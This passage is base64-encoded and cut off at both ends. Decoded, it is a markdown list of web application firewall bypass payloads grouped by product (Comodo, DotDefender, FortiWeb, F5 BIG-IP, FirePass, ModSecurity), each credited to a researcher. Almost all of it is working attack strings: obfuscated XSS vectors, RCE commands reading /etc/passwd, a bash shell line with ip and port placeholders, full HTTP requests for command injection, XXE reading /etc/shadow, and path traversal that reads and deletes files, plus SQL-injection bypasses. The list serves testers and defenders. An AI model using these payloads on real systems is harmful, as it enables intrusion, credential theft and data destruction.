c3NdKGh0dHBzOi8vcGFzdGViaW4uY29tL2k4QW5zNGQ0KSBieSBbQGMwZDNn
MzNrXShodHRwczovL3R3aXR0ZXIuY29tL2MwZDNnMzNrKQpgYGAKPGErSFJF
Rj0namF2YXNjcmlwJTI2JTIzOXQ6YWxlcnQlMjZscGFyO2RvY3VtZW50LmRv
bWFpbiknPnRlc3Q8L2E+CmBgYAotIFtYU1MgQnlwYXNzZXNdKGh0dHBzOi8v
dHdpdHRlci5jb20vaDFfcmFnbmFyKSBieSBbQEJvaGRhbiBLb3J6aHluc2t5
aV0oaHR0cHM6Ly90d2l0dGVyLmNvbS9oMV9yYWduYXIpCmBgYAo8c3ZnIG9u
bG9hZD1wcm9tcHQlMjYlMjMwMDAwMDAwMDQwZG9jdW1lbnQuZG9tYWluKT4K
PHN2ZyBvbmxvYWQ9cHJvbXB0JTI2JTIzeDAwMDAwMDAyODtkb2N1bWVudC5k
b21haW4pPgp4c3MnIj48aWZyYW1lIHNyY2RvYz0nJTI2bHQ7c2NyaXB0Pjtw
cm9tcHRgJHtkb2N1bWVudC5kb21haW59YCUyNmx0Oy9zY3JpcHQ+Jz4KMSci
PjxpbWcvc3JjL29uZXJyb3I9LjF8YWxlcnRgYD4KYGBgCi0gW1hTUyBCeXBh
c3NdKGh0dHBzOi8vdHdpdHRlci5jb20vUmFrZXNoTWFuZTEwL3N0YXR1cy8x
MTA5MDA4Njg2MDQxNzU5NzQ0KSBieSBbQFJha2VzaE1hbmUxMF0oaHR0cHM6
Ly90d2l0dGVyLmNvbS9yYWtlc2htYW5lMTApCmBgYAo8c3ZnL29ubG9hZD0m
Izk3JiMxMDgmIzEwMSYjMTE0JiMwMDExNiYjNDAmIzQxJiN4MmYmI3gyZgpg
YGAKLSBbWFNTIEJ5cGFzc10oaHR0cHM6Ly90d2l0dGVyLmNvbS9BcmJhektp
cmFhay9zdGF0dXMvMTA5MDY1NDA2Njk4NjgyMzY4MCkgYnkgW0BBcmJhektp
cmFha10oaHR0cHM6Ly90d2l0dGVyLmNvbS9BcmJhektpcmFhaykKYGBgCjxh
IGhyZWY9ImomVGFiO2EmVGFiO3YmVGFiO2FzYyZOZXdMaW5lO3JpJlRhYjtw
dCZjb2xvbjtcdTAwNjFcdTAwNkNcdTAwNjVcdTAwNzJcdTAwNzQmbHBhcjt0
aGlzWydkb2N1bWVudCddWydjb29raWUnXSZycGFyOyI+WDwvYT5gCmBgYAot
IFhTUyBCeXBhc3MgYnkgW0BBaG1ldCDDnG1pdF0oaHR0cHM6Ly90d2l0dGVy
LmNvbS9haG1ldHVtaXRiYXlyYW0pCmBgYAo8LS1gPGltZy9zcmM9YCBvbmVy
cm9yPWNvbmZpcm1gYD4gLS0hPgpgYGAKLSBbWFNTIEJ5cGFzc10oaHR0cHM6
Ly90d2l0dGVyLmNvbS9sZTRybmVyL3N0YXR1cy8xMTQ2NDUzOTgwNDAwMDgy
OTQ1KSBieSBbQFNoaXZhIEtyaXNobmFdKGh0dHBzOi8vdHdpdHRlci5jb20v
bGU0cm5lcikKYGBgCmphdmFzY3JpcHQ6e2FsZXJ0YDBgfQpgYGAKLSBbWFNT
IEJ5cGFzc10oaHR0cHM6Ly90d2l0dGVyLmNvbS9icnV0ZWxvZ2ljL3N0YXR1
cy8xMTQ3MTE4MzcxOTY1NzU1MzkzKSBieSBbQEJydXRlIExvZ2ljXShodHRw
czovL3R3aXR0ZXIuY29tL2JydXRlbG9naWMpCmBgYAo8YmFzZSBocmVmPS8v
a25veHNzLm1lPwpgYGAKLSBbWFNTIEJ5cGFzc10oaHR0cHM6Ly90d2l0dGVy
LmNvbS9SZW53YVgyMy9zdGF0dXMvMTE0NzEzMDA5MTAzMTQ0OTYwMSkgYnkg
W0BSZW53YVgyM10oaHR0cHM6Ly90d2l0dGVyLmNvbS9SZW53YVgyMykgKENo
cm9tZSBvbmx5KQpgYGAKPGogaWQ9eCBzdHlsZT0iLXdlYmtpdC11c2VyLW1v
ZGlmeTpyZWFkLXdyaXRlIiBvbmZvY3VzPXt3aW5kb3cub25lcnJvcj1ldmFs
fXRocm93LzAvK25hbWU+SDwvaj4jeCAKYGBgCi0gW1JDRSBQYXlsb2FkIERl
dGVjdGlvbiBCeXBhc3NdKGh0dHBzOi8vd3d3LnNlY2p1aWNlLmNvbS93ZWIt
YXBwbGljYXRpb24tZmlyZXdhbGwtd2FmLWV2YXNpb24vKSBieSBbQHRoZU1p
ZGRsZV0oaHR0cHM6Ly90d2l0dGVyLmNvbS9NZW5pbl9UaGVNaWRkbGUpCmBg
YApjYXQkdSsvZXRjJHUvcGFzc3dkJHUKL2JpbiR1L2Jhc2gkdSA8aXA+IDxw
b3J0PgoiO2NhdCsvZXRjL3Bhc3N3ZCsjCmBgYAoKIyMjIENvbW9kbyAKLSBY
U1MgQnlwYXNzIGJ5IFtAMHhJbmZlY3Rpb25dKGh0dHBzOi8vdHdpdHRlci5j
b20vMHhpbmZlY3Rpb24pCmBgYAo8aW5wdXQvb25pbnB1dD0nbmV3IEZ1bmN0
aW9uYGNvbmZpclx1MDA2ZFxgMFxgYCc+CjxwL29uZHJhZ3N0YXJ0PSUyN2Nv
bmZpcm0oMCklMjcucmVwbGFjZSgvLisvLGV2YWwpJTIwZHJhZ2dhYmxlPVRy
dWU+ZHJhZ21lCmBgYAotIFNRTGkgYnkgW0BXQUZOaW5qYV0oaHR0cHM6Ly93
YWYubmluamEpCmBgYAowIHVuaW9uLyoqL3NlbGVjdCAxLHZlcnNpb24oKSxA
QGRhdGFkaXIKYGBgCgojIyMgRG90RGVmZW5kZXIKLSBGaXJld2FsbCBkaXNh
YmxlIGJ5ICh2NS4wKSBieSBbQGh5cDNybGlueF0oaHR0cDovL2h5cDNybGlu
eC5hbHRlcnZpc3RhLm9yZykKYGBgClBHVnVZV0pzWldRK1ptRnNjMlU4TDJW
dVlXSnNaV1ErCjxlbmFibGVkPmZhbHNlPC9lbmFibGVkPgpgYGAKLSBSZW1v
dGUgQ29tbWFuZCBFeGVjdXRpb24gKHYzLjgtNSkgYnkgW0BKb2huIERvc10o
aHR0cHM6Ly93d3cuZXhwbG9pdC1kYi5jb20vP2F1dGhvcj0xOTk2KQpgYGAK
UE9TVCAvZG90RGVmZW5kZXIvaW5kZXguY2dpIEhUVFAvMS4xCkhvc3Q6IDE3
Mi4xNi4xNTkuMTMyClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChNYWNpbnRv
c2g7IFU7IEludGVsIE1hYyBPUyBYIDEwLjY7IGVuLVVTOyBydjoxLjkuMS41
KSBHZWNrby8yMDA5MTEwMiBGaXJlZm94LzMuNS41CkFjY2VwdDogdGV4dC9o
dG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0w
LjksKi8qO3E9MC44CkFjY2VwdC1MYW5ndWFnZTogZW4tdXMsZW47cT0wLjUK
QWNjZXB0LUVuY29kaW5nOiBnemlwLGRlZmxhdGUKQWNjZXB0LUNoYXJzZXQ6
IElTTy04ODU5LTEsdXRmLTg7cT0wLjcsKjtxPTAuNwpLZWVwLUFsaXZlOiAz
MDAKQ29ubmVjdGlvbjoga2VlcC1hbGl2ZQpBdXRob3JpemF0aW9uOiBCYXNp
YyBZV1J0YVc0NgpDYWNoZS1Db250cm9sOiBtYXgtYWdlPTAKQ29udGVudC1U
eXBlOiBhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQKQ29udGVu
dC1MZW5ndGg6IDk1CgpzaXRlbmFtZT1kb3RkZWZlYXRlciZkZWxldGVzaXRl
bmFtZT1kb3RkZWZlYXRlcjtpZDtscyAtYWwgLi4vO3B3ZDsmYWN0aW9uPWRl
bGV0ZXNpdGUmbGluZW51bT0xNQpgYGAKLSBQZXJzaXN0ZW50IFhTUyAodjQu
MCkgYnkgW0BFbmFibGVTZWN1cml0eV0oaHR0cHM6Ly9lbmFibGVzZWN1cml0
eS5jb20pCmBgYApHRVQgL2M/YT08c2NyaXB0PiBIVFRQLzEuMQpIb3N0OiAx
NzIuMTYuMTU5LjEzMgpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoTWFjaW50
b3NoOyBVOyBJbnRlbCBNYWMgT1MgWCAxMC42OyBlbi1VUzsKcnY6MS45LjEu
NSkgR2Vja28vMjAwOTExMDIgRmlyZWZveC8zLjUuNQpBY2NlcHQ6IHRleHQv
aHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9
MC45LCovKjtxPTAuOApBY2NlcHQtTGFuZ3VhZ2U6IGVuLXVzLGVuO3E9MC41
CkFjY2VwdC1FbmNvZGluZzogZ3ppcCxkZWZsYXRlCkFjY2VwdC1DaGFyc2V0
OiBJU08tODg1OS0xLHV0Zi04O3E9MC43LCo7cT0wLjcKPHNjcmlwdD5hbGVy
dCgxKTwvc2NyaXB0PjogYWEKS2VlcC1BbGl2ZTogMzAwCmBgYAotIFItWFNT
IEJ5cGFzcyBieSBbQFdBRk5pbmphXShodHRwczovL3dhZi5uaW5qYSkKYGBg
Cjxzdmcvb25sb2FkPXByb21wdCgxKTs+Cjxpc2luZGV4IGFjdGlvbj0iamF2
YXMmdGFiO2NyaXB0OmFsZXJ0KDEpIiB0eXBlPWltYWdlPgo8bWFycXVlZS9v
bnN0YXJ0PWNvbmZpcm0oMik+CmBgYAotIFhTUyBCeXBhc3MgYnkgW0AweElu
ZmVjdGlvbl0oaHR0cHM6Ly90d2l0dGVyLmNvbS8weGluZmVjdGlvbikKYGBg
CjxwIGRyYWdnYWJsZT1UcnVlIG9uZHJhZ3N0YXJ0PXByb21wdCgpPmFsZXJ0
CjxibGVoL29uZHJhZ3N0YXJ0PSZUYWI7cGFyZW50JlRhYjtbJ29wZW4nXSZU
YWI7JmxwYXI7JnJwYXI7JTIwZHJhZ2dhYmxlPVRydWU+ZHJhZ21lCmBgYAot
IEdFVCAtIFhTUyBCeXBhc3MgKHY0LjAyKSBieSBbQERhdmlkS10oaHR0cHM6
Ly93d3cuZXhwbG9pdC1kYi5jb20vP2F1dGhvcj0yNzQxKQpgYGAKL3NlYXJj
aD9xPSUzQ2ltZyUyMHNyYz0lMjJXVEYlMjIlMjBvbkVycm9yPWFsZXJ0KC8w
d24zZC8uc291cmNlKSUyMC8lM0UKCjxpbWcgc3JjPSJXVEYiIG9uRXJyb3I9
Int2YXIKezM6cywyOmgsNTphLDA6diw0Om4sMTplfT0nZWFybHR2J31bc2Vs
Zl1bMF1bdiUyQmElMkJlJTJCc10oZSUyQnMlMkJ2JTJCCmglMkJuKSgvMHdu
M2QvLnNvdXJjZSkiIC8+CmBgYAotIFBPU1QgLSBYU1MgQnlwYXNzICh2NC4w
MikgYnkgW0BEYXZpZEtdKGh0dHBzOi8vd3d3LmV4cGxvaXQtZGIuY29tLz9h
dXRob3I9Mjc0MSkKYGBgCjxpbWcgc3JjPSJXVEYiIG9uRXJyb3I9Int2YXIK
ezM6cywyOmgsNTphLDA6diw0Om4sMTplfT0nZWFybHR2J31bc2VsZl1bMF1b
dithK2Urc10oZStzK3YraCtuKSgvMHduM2QvCi5zb3VyY2UpIiAvPgpgYGAK
LSBgY2xhdmVgIFhTUyAodjQuMDIpIGJ5IFtARGF2aWRLXShodHRwczovL3d3
dy5leHBsb2l0LWRiLmNvbS8/YXV0aG9yPTI3NDEpCmBgYAovPyZpZFBhaXM9
MyZjbGF2ZT0lM0NpbWclMjBzcmM9JTIyV1RGJTIyJTIwb25FcnJvcj0lMjJ7
IApgYGAKCiMjIyBGb3J0aW5ldCBGb3J0aXdlYgotIGBwY3JlX2V4cHJlc3Np
b25gIHVudmFpZGF0ZWQgWFNTIGJ5IFtAQmVuamFtaW4gTWVqcmldKGh0dHBz
Oi8vd3d3LmV4cGxvaXQtZGIuY29tLz9hdXRob3I9Nzg1NCkKYGBgCi93YWYv
cGNyZV9leHByZXNzaW9uL3ZhbGlkYXRlP3JlZGlyPS9zdWNjZXNzJm1rZXk9
MCUyMiUzRSUzQ2lmcmFtZSUyMHNyYz1odHRwOi8vdnVsbi1sYWIuY29tJTIw
b25sb2FkPWFsZXJ0JTI4JTIyVkwlMjIlMjklMjAlM0MKL3dhZi9wY3JlX2V4
cHJlc3Npb24vdmFsaWRhdGU/cmVkaXI9L3N1Y2Nlc3MlMjAlMjIlM0UlM0Np
ZnJhbWUlMjBzcmM9aHR0cDovL3Z1bG4tbGFiLmNvbSUyMG9ubG9hZD1hbGVy
dCUyOCUyMlZMJTIyJTI5JTIwJTNDJm1rZXk9MCAKYGBgCi0gQ1NQIEJ5cGFz
cyBieSBbQEJpbmFyMTBdKGh0dHBzOi8vd3d3LmV4cGxvaXQtZGIuY29tL2V4
cGxvaXRzLzE4ODQwKQoKUE9TVCBUeXBlIFF1ZXJ5CmBgYApQT1NUIC88cGF0
aD4vbG9naW4tYXBwLmFzcHggSFRUUC8xLjEKSG9zdDogPGhvc3Q+ClVzZXIt
QWdlbnQ6IDxhbnkgdmFsaWQgdXNlciBhZ2VudCBzdHJpbmc+CkFjY2VwdC1F
bmNvZGluZzogZ3ppcCwgZGVmbGF0ZQpDb25uZWN0aW9uOiBrZWVwLWFsaXZl
CkNvbnRlbnQtVHlwZTogYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNv
ZGVkCkNvbnRlbnQtTGVuZ3RoOiA8dGhlIGNvbnRlbnQgbGVuZ3RoIG11c3Qg
YmUgYXQgbGVhc3QgMjM5OSBieXRlcz4KCnZhcjE9ZGF0YXZhcjEmdmFyMj1k
YXRhdmFyMTImcGFkPTxyYW5kb20gZGF0YSB0byBjb21wbGV0ZSBhdCBsZWFz
dCAyMzk5IGJ5dGVzPgpgYGAKR0VUIFR5cGUgUXVlcnkKYGBgCmh0dHA6Ly88
ZG9tYWluPi9wYXRoP3ZhcjE9dmFyZGF0YTEmdmFyMj12YXJkYXRhMiZwYWQ9
PGxhcmdlIGFyYml0cmFyeSBkYXRhPgpgYGAKCiMjIyBGNSBBU00gCi0gWFNT
IEJ5cGFzcyBieSBbQFdBRk5pbmphXShodHRwczovL3dhZi5uaW5qYSkKYGBg
Cjx0YWJsZSBiYWNrZ3JvdW5kPSJqYXZhc2NyaXB0OmFsZXJ0KDEpIj48L3Rh
YmxlPgoiLz48bWFycXVlZSBvbmZpbmlzaD1jb25maXJtKDEyMyk+YTwvbWFy
cXVlZT4KYGBgCgojIyMgRjUgQklHLUlQCi0gWFNTIEJ5cGFzcyBieSBbQFdB
Rk5pbmphXShodHRwczovL3dhZi5uaW5qYS8pCmBgYAo8Ym9keSBzdHlsZT0i
aGVpZ2h0OjEwMDBweCIgb253aGVlbD0iW0RBVEFdIj4KPGRpdiBjb250ZXh0
bWVudT0ieHNzIj5SaWdodC1DbGljayBIZXJlPG1lbnUgaWQ9InhzcyIgb25z
aG93PSJbREFUQV0iPgo8Ym9keSBzdHlsZT0iaGVpZ2h0OjEwMDBweCIgb253
aGVlbD0icHJvbSUyNSUzMiUzMyUyNSUzMiUzNng3MDt0KDEpIj4KPGRpdiBj
b250ZXh0bWVudT0ieHNzIj5SaWdodC1DbGljayBIZXJlPG1lbnUgaWQ9Inhz
cyIgb25zaG93PSJwcm9tJTI1JTMyJTMzJTI1JTMyJTM2eDcwO3QoMSkiPgpg
YGAKLSBYU1MgQnlwYXNzIGJ5IFtAQWF0aWYgS2hhbl0oaHR0cHM6Ly90d2l0
dGVyLmNvbS90aGVuYXBzdGVya2hhbikKYGBgCjxib2R5IHN0eWxlPSJoZWln
aHQ6MTAwMHB4IiBvbndoZWVsPSJwcm9tJTI1JTMyJTMzJTI1JTMyJTM2eDcw
O3QoMSkiPgo8ZGl2IGNvbnRleHRtZW51PSJ4c3MiPlJpZ2h0LUNsaWNrIEhl
cmU8bWVudSBpZD0ieHNzIm9uc2hvdz0icHJvbSUyNSUzMiUzMyUyNSUzMiUz
Nng3MDt0KDEp4oCcPgpgYGAKLSBbYHJlcG9ydF90eXBlYCBYU1NdKGh0dHBz
Oi8vd3d3LnNlY3VyaXR5Zm9jdXMuY29tL2JpZC8yNzQ2Mi9pbmZvKSBieSBb
QE5OUG9zdGVyXShodHRwczovL3d3dy5leHBsb2l0LWRiLmNvbS8/YXV0aG9y
PTY2NTQpCmBgYApodHRwczovL2hvc3QvZG1zL3BvbGljeS9yZXBfcmVxdWVz
dC5waHA/cmVwb3J0X3R5cGU9JTIyJTNFJTNDYm9keStvbmxvYWQ9YWxlcnQo
JTI2cXVvdCUzQlhTUyUyNnF1b3QlM0IpJTNFJTNDZm9vKwpgYGAKLSBQT1NU
IEJhc2VkIFhYRSBieSBbQEFub255bW91c10oaHR0cHM6Ly93d3cuZXhwbG9p
dC1kYi5jb20vP2F1dGhvcj0yMTY4KQpgYGAKUE9TVCAvc2FtL2FkbWluL3Zw
ZTIvcHVibGljL3BocC9zZXJ2ZXIucGhwIEhUVFAvMS4xCkhvc3Q6IGJpZ2lw
CkNvb2tpZTogQklHSVBBdXRoQ29va2llPSpWQUxJRF9DT09LSUUqCkNvbnRl
bnQtTGVuZ3RoOiAxNDMKCjw/eG1sICB2ZXJzaW9uPSIxLjAiIGVuY29kaW5n
PSd1dGYtOCcgPz4KPCFET0NUWVBFIGEgWzwhRU5USVRZIGUgU1lTVEVNICcv
ZXRjL3NoYWRvdyc+IF0+CjxtZXNzYWdlPjxkaWFsb2d1ZVR5cGU+JmU7PC9k
aWFsb2d1ZVR5cGU+PC9tZXNzYWdlPgpgYGAKLSBEaXJlY3RvcnkgVHJhdmVy
c2FsIGJ5IFtAQW5hc3Rhc2lvcyBNb25hY2hvc10oaHR0cHM6Ly93d3cuZXhw
bG9pdC1kYi5jb20vP2F1dGhvcj0yOTMyKQoKUmVhZCBBcmJpdHJhcnkgRmls
ZQpgYGAKL3RtdWkvQ29udHJvbC9qc3BtYXAvdG11aS9zeXN0ZW0vYXJjaGl2
ZS9wcm9wZXJ0aWVzLmpzcD8mbmFtZT0uLi8uLi8uLi8uLi8uLi9ldGMvcGFz
c3dkCmBgYApEZWxldGUgQXJiaXRyYXJ5IEZpbGUKYGBgClBPU1QgL3RtdWkv
Q29udHJvbC9mb3JtIEhUVFAvMS4xCkhvc3Q6IHNpdGUuY29tClVzZXItQWdl
bnQ6IE1vemlsbGEvNS4wIChNYWNpbnRvc2g7IEludGVsIE1hYyBPUyBYIDEw
Ljk7IHJ2OjMyLjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMzIuMApBY2Nl
cHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRp
b24veG1sO3E9MC45LCovKjtxPTAuOApBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVT
LGVuO3E9MC41CkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZQpDb29r
aWU6IEpTRVNTSU9OSUQ9NkM2QkFEQkVGQjMyQzM2Q0RFN0E1OUM0MTY2NTk0
OTQ7IGY1YWR2YW5jZWRkaXNwbGF5PSIiOyBCSUdJUEF1dGhDb29raWU9ODlD
MUUzQkRBODZCREY5RTBENjRBQjYwNDE3OTc5Q0ExRDlCRTFENDsgQklHSVBB
dXRoVXNlcm5hbWVDb29raWU9YWRtaW47IEY1X0NVUlJFTlRfUEFSVElUSU9O
PUNvbW1vbjsgZjVmb3JtcGFnZT0iL3RtdWkvc3lzdGVtL2FyY2hpdmUvcHJv
cGVydGllcy5qc3A/Jm5hbWU9Li4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZCI7
IGY1Y3VycmVudHRhYj0ibWFpbiI7IGY1bWFpbm1lbnVvcGVubGlzdD0iIjsg
ZjVfcmVmcmVzaHBhZ2U9L3RtdWkvQ29udHJvbC9qc3BtYXAvdG11aS9zeXN0
ZW0vYXJjaGl2ZS9wcm9wZXJ0aWVzLmpzcCUzRm5hbWUlM0QuLi8uLi8uLi8u
Li8uLi9ldGMvcGFzc3dkCkNvbnRlbnQtVHlwZTogYXBwbGljYXRpb24veC13
d3ctZm9ybS11cmxlbmNvZGVkCgpfZm9ybV9ob2xkZXJfb3BlbmVyXz0maGFu
ZGxlcj0lMkZ0bXVpJTJGc3lzdGVtJTJGYXJjaGl2ZSUyRnByb3BlcnRpZXMm
aGFuZGxlcl9iZWZvcmU9JTJGdG11aSUyRnN5c3RlbSUyRmFyY2hpdmUlMkZw
cm9wZXJ0aWVzJnNob3dPYmpMaXN0PSZzaG93T2JqTGlzdF9iZWZvcmU9Jmhp
ZGVPYmpMaXN0PSZoaWRlT2JqTGlzdF9iZWZvcmU9JmVuYWJsZU9iakxpc3Q9
JmVuYWJsZU9iakxpc3RfYmVmb3JlPSZkaXNhYmxlT2JqTGlzdD0mZGlzYWJs
ZU9iakxpc3RfYmVmb3JlPSZfYnVmdmFsdWU9aWNIanZhaHIzNTROWkt0Z1FY
bDV5aDJiJl9idWZ2YWx1ZV9iZWZvcmU9aWNIanZhaHIzNTROWkt0Z1FYbDV5
aDJiJl9idWZ2YWx1ZV92YWxpZGF0aW9uPU5PX1ZBTElEQVRJT04mY29tLmY1
LnV0aWwuTGlua2VkQWRkLmFjdGlvbl9vdmVycmlkZT0lMkZ0bXVpJTJGc3lz
dGVtJTJGYXJjaGl2ZSUyRnByb3BlcnRpZXMmY29tLmY1LnV0aWwuTGlua2Vk
QWRkLmFjdGlvbl9vdmVycmlkZV9iZWZvcmU9JTJGdG11aSUyRnN5c3RlbSUy
RmFyY2hpdmUlMkZwcm9wZXJ0aWVzJmxpbmtlZF9hZGRfaWQ9JmxpbmtlZF9h
ZGRfaWRfYmVmb3JlPSZuYW1lPS4uJTJGLi4lMkYuLiUyRi4uJTJGLi4lMkZl
dGMlMkZwYXNzd2QmbmFtZV9iZWZvcmU9Li4lMkYuLiUyRi4uJTJGLi4lMkYu
LiUyRmV0YyUyRnBhc3N3ZCZmb3JtX3BhZ2U9JTJGdG11aSUyRnN5c3RlbSUy
RmFyY2hpdmUlMkZwcm9wZXJ0aWVzLmpzcCUzRiZmb3JtX3BhZ2VfYmVmb3Jl
PSUyRnRtdWklMkZzeXN0ZW0lMkZhcmNoaXZlJTJGcHJvcGVydGllcy5qc3Al
M0YmZG93bmxvYWRfYmVmb3JlPURvd25sb2FkJTNBKy4uJTJGLi4lMkYuLiUy
Ri4uJTJGLi4lMkZldGMlMkZwYXNzd2QmcmVzdG9yZV9iZWZvcmU9UmVzdG9y
ZSZkZWxldGU9RGVsZXRlJmRlbGV0ZV9iZWZvcmU9RGVsZXRlCmBgYAoKIyMj
IEY1IEZpcmVQYXNzCi0gU1FMaSBCeXBhc3MgZnJvbSBbQEFub255bW91c10o
aHR0cHM6Ly93d3cuZXhwbG9pdC1kYi5jb20vP2F1dGhvcj0yMTY4KQpgYGAK
c3RhdGU9JTI1MjcrYW5kKwooY2FzZSt3aGVuK1NVQlNUUklORyhMT0FEX0ZJ
TEUoJTI1MjcvZXRjL3Bhc3N3ZCUyNTI3KSwxLDEpPWNoYXIoMTE0KSt0aGVu
KwpCRU5DSE1BUksoNDAwMDAwMDAsRU5DT0RFKCUyNTI3aGVsbG8lMjUyNywl
MjUyN2JhdG1hbiUyNTI3KSkrZWxzZSswK2VuZCk9MCstLSsgCmBgYAoKIyMj
IE1vZFNlY3VyaXR5Ci0gW1JDRSBQYXlsb2FkcyBEZXRlY3Rpb24gQnlwYXNz
IGZvciBQTDNdKGh0dHBzOi8vd3d3LnNlY2p1aWNlLmNvbS93ZWItYXBwbGlj
YXRpb24tZmlyZXdhbGwtd2FmLWV2YXNpb24vKSBieSBbQHRoZU1pZGRsZV0o
aHR0cHM6Ly90d2l0dGVyLmNvbS9NZW5pbl9UaGVNaWRkbGUpICh2My4xKQpg
YGAKOyskdStjYXQrL2V0YyR1L3Bhc3N3ZCR1CmBgYAotIFtSQ0UgUGF5bG9h
ZHMgRGV0ZWN0aW9uIEJ5cGFzcyBmb3IgUEwyXShodHRwczovL3d3dy5zZWNq
dWljZS5jb20vd2ViLWFwcGxpY2F0aW9uLWZpcmV3YWxsLXdhZi1ldmFzaW9u
LykgYnkgW0B0aGVNaWRkbGVdKGh0dHBzOi8vdHdpdHRlci5jb20vTWVuaW5f
VGhlTWlkZGxlKSAodjMuMSkKYGBgCjsrJHUrY2F0Ky9ldGMkdS9wYXNzd2Qr
XCMKYGBgCi0gW1JDRSBQYXlsb2FkcyBmb3IgUEwxIGFuZCBQTDJdKGh0dHBz
Oi8vbWVkaXVtLmNvbS9zZWNqdWljZS93YWYtZXZhc2lvbi10ZWNobmlxdWVz
LTcxODAyNmQ2OTNkOCkgYnkgW0B0aGVNaWRkbGVdKGh0dHBzOi8vdHdpdHRl
ci5jb20vTWVuaW5fVGhlTWlkZGxlKSAodjMuMCkKYGBgCi8/Pz8vPz90Ky8/
Pz8vPz9zcz8/CmBgYAotIFtSQ0UgUGF5bG9hZHMgZm9yIFBMM10oaHR0cHM6
Ly9tZWRpdW0uY29tL3NlY2p1aWNlL3dhZi1ldmFzaW9uLXRlY2huaXF1ZXMt
NzE4MDI2ZDY5M2Q4KSBieSBbQHRoZU1pZGRsZV0oaHR0cHM6Ly90d2l0dGVy
LmNvbS9NZW5pbl9UaGVNaWRkbGUpICh2My4wKQpgYGAKLz9pbi9jYXQrL2V0
Py9wYXNzdz8KYGBgCi0gW1NRTGkgQnlwYXNzXShodHRwczovL3d3dy50cnVz
dHdhdmUuY29tL2VuLXVzL3Jlc291cmNlcy9ibG9ncy9zcGlkZXJsYWJzLWJs
b2cvbW9kc2VjdXJpdHktc3FsLWluamVjdGlvbi1jaGFsbGVuZ2UtbGVzc29u
cy1sZWFybmVkLykgYnkgW0BKb2hhbm5lcyBEYWhzZV0oaHR0cHM6Ly90d2l0
dGVyLmNvbS8jIS9mbHV4cmVpbmVycykgKHYyLjIpCmBgYAowK2RpdisxK3Vu
aW9uJTIzZm9vKiUyRipiYXIlMEQlMEFzZWxlY3QlMjNmb28lMEQlMEExJTJD
MiUyQ2N1cnJlbnRfdXNlcgpgYGAKLSBbU1FMaSBCeXBhc3NdKGh0dHBzOi8v
d3d3LnRydXN0d2F2ZS5jb20vZW4tdXMvcmVzb3VyY2VzL2Jsb2dzL3NwaWRl
cmxhYnMtYmxvZy9tb2RzZWN1cml0eS1zcWwtaW5qZWN0aW9uLWNoYWxsZW5n
ZS1sZXNzb25zLWxlYXJuZWQvKSBieSBbQFl1cmkgR29sdHNldl0oaHR0cHM6
Ly90d2l0dGVyLmNvbS8jIS95Z29sdHNldikgKHYyLjIpCmBgYAoxIEFORCAo
c2VsZWN0IERDb3VudChsYXN0KHVzZXJuYW1lKSZhZnRlcj0xJmFmdGVyPTEp
IGZyb20gdXNlcnMgd2hlcmUgdXNlcm5hbWU9J2FkMW1pbicpCmBgYAotIFtT
UUxpIEJ5cGFzc10oaHR0cHM6Ly93d3cudHJ1c3R3YXZlLmNvbS9lbi11cy9y
ZXNvdXJjZXMvYmxvZ3Mvc3BpZGVybGFicy1ibG9nL21vZHNlY3VyaXR5LXNx
bC1pbmplY3Rpb24tY2hhbGxlbmdlLWxlc3NvbnMtbGVhcm5lZC8pIGJ5IFtA
QWhtYWQgTWF1bGFuYV0oaHR0cDovL3R3aXR0ZXIuY29tLyMhL2htYWRyd3gp
ICh2Mi4yKQpgYGAKMSdVTklPTi8qITBTRUxFQ1QgdXNlciwyLDMsNCw1LDYs
Nyw4LDkvKiEwZnJvbS8qITBteXNxbC51c2VyLyotCmBgYAotIFtTUUxpIEJ5
cGFzc10oaHR0cHM6Ly93d3cudHJ1c3R3YXZlLmNvbS9lbi11cy9yZXNvdXJj
ZXMvYmxvZ3Mvc3BpZGVybGFicy1ibG9nL21vZHNlY3VyaXR5LXNxbC1pbmpl
Y3Rpb24tY2hhbGxlbmdlLWxlc3NvbnMtbGVhcm5lZC8pIGJ5IFtAVHJhdmlz
IExlZV0oaHR0cDovL3R3aXR0ZXIuY29tLyMhL2VlbHNpdmFydCkgKHYyLjIp
CmBgYAphbVVzZXJJZD0xIHVuaW9uIHNlbGVjdCB1c2VybmFtZSxwYXNzd29y
ZCwzLDQgZnJvbSB1c2VycwpgYGAKLSBbU1FMaSBCeXBhc3NdKGh0dHBzOi8v
d3d3LnRydXN0d2F2ZS5jb20vZW4tdXMvcmVzb3VyY2VzL2Jsb2dzL3NwaWRl
cmxhYnMtYmxvZy9tb2RzZWN1cml0eS1zcWwtaW5qZWN0aW9uLWNoYWxsZW5n
ZS1sZXNzb25zLWxlYXJuZWQvKSBieSBbQFJvYmVydG8gU2FsZ2Fkb10oaHR0
cDovL3R3aXR0ZXIuY29tLyMhL2xpZ2h0b3MpICh2Mi4yKQpgYGAKJTBBc2Vs
ZWN0JTIwMHgwMCwlMjAweDQxJTIwbGlrZS8qITMxMzM3dGFibGVfbmFtZSov
LDMlMjBmcm9tJTIwaW5mb3JtYXRpb25fc2NoZW1hLnRhYmxlcyUyMGxpbWl0
JTIwMQpgYGAKLSBbU1FMaSBCeXBhc3NdKGh0dHBzOi8vd3d3LnRydXN0d2F2
ZS5jb20vZW4tdXMvcmVzb3VyY2VzL2Jsb2dzL3NwaWRlcmxhYnMtYmxvZy9t
b2RzZWN1cml0eS1zcWwtaW5qZWN0aW9uLWNoYWxsZW5nZS1sZXNzb25zLWxl
YXJuZWQvKSBieSBbQEdlb3JnaSBHZXNoZXZdKGh0dHA6Ly90d2l0dGVyLmNv
bS8jIS9nZ2VzaGV2KSAodjIuMikKYGBgCjElMGJBTkQoU0VMRUNUJTBiMSUy
MEZST00lMjBteXNxbC54KQpgYGAKLSBbU1FMaSBCeXBhc3NdKGh0dHBzOi8v
